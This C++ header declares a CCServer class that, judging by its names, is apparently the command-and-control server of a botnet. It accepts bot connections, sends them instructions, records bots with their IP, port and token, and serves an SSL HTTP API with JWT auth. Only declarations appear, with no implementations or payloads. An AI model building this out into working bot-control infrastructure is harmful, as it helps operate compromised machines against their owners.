#pragma once
#include "BaseServer.h"
#include <boost/asio/ssl.hpp>
#include <boost/beast/http.hpp>

namespace http = boost::beast::http;
namespace ssl = boost::asio::ssl;
namespace ip = boost::asio::ip;

class CCServer : public BaseServer {
private:
  boost::asio::ssl::context m_ssl_context;
  boost::asio::io_context m_io_context;
  std::vector<std::thread> m_threads;
  std::unique_ptr<ip::tcp::acceptor> m_acceptor;
  std::unique_ptr<ip::tcp::socket> m_log_socket;
  std::map<std::string, std::string> m_configs;
  nlohmann::json m_api_endpoints;

public:
  CCServer(const nlohmann::json &config_file);
  ~CCServer();

  // base server
  void start_server() override;
  void react_to_config_update(const nlohmann::json &config) override;
  void start_accept() override;

  // bot handling
  void handle_bot(std::shared_ptr<ip::tcp::socket> bot_socket);

  // request handling
  void handle_request(std::shared_ptr<ssl::stream<ip::tcp::socket>> socket);
  void
  process_request(std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
                  std::shared_ptr<http::request<http::string_body>> request);

  // response handling
  void
  send_not_found_response(std::shared_ptr<ssl::stream<ip::tcp::socket>> socket);
  void send_response(std::shared_ptr<ssl::stream<ip::tcp::socket>> socket, 
                     std::shared_ptr<http::response<http::string_body>> response);  
  void send_unauthorized_response(std::shared_ptr<ssl::stream<ip::tcp::socket>> socket);

  // api
  void handle_file_request(
      std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
      std::shared_ptr<http::request<http::string_body>> request);
  void handle_settings_request(
      std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
      std::shared_ptr<http::request<http::string_body>> request);
  void handle_auth_request(
      std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
      std::shared_ptr<http::request<http::string_body>> request);
  
  // http
  std::string
  get_auth_token(std::shared_ptr<http::request<http::string_body>> request);
  std::string
  get_timestamp(std::shared_ptr<http::request<http::string_body>> request);
  std::string generate_jwt(const std::string &uuid);
  std::string current_time_stamp();

  // instructions
  void send_instructions(const nlohmann::json &instructions,
                         std::shared_ptr<ip::tcp::socket> client_socket);

  // database
  void create_bot(const std::string &uuid, const std::string &token,
                  const std::string &timestamp, const std::string &ip,
                  const std::string &port);
};